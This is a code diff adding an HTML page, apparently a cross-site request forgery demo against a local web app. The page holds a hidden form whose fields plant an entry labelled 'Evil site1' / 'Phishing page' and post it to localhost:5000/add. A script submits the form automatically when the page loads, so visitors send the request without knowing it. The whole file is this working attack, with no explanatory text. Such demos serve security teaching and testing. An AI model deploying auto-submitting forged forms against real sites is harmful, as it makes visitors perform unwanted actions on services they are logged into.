@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+</head>
+<body>
+<h1>My site</h1>
+
+<form method="post" id='a' action="http://localhost:5000/add">
+    <input type="hidden" name="title" value="Evil site1">
+    <input type="hidden" name="descr" value="Phishing page">
+    <input type="hidden" name="link" value="http://mail.ru">
+    <input type="submit" value="Ok">
+</form>
+<script>
+    document.getElementById('a').submit()
+</script>
+
+</body>
+</html>
